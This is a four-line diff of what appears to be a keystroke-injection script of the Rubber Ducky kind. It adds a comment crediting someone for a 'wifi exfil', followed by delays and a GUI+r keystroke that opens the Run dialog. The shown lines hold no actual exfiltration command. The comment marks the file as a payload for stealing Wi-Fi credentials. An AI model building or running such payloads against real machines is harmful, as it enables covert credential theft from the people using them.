@@ -1,3 +1,4 @@
+REM credits to uber for the wifi exfil
 DELAY 500
 GUI r
 DELAY 500
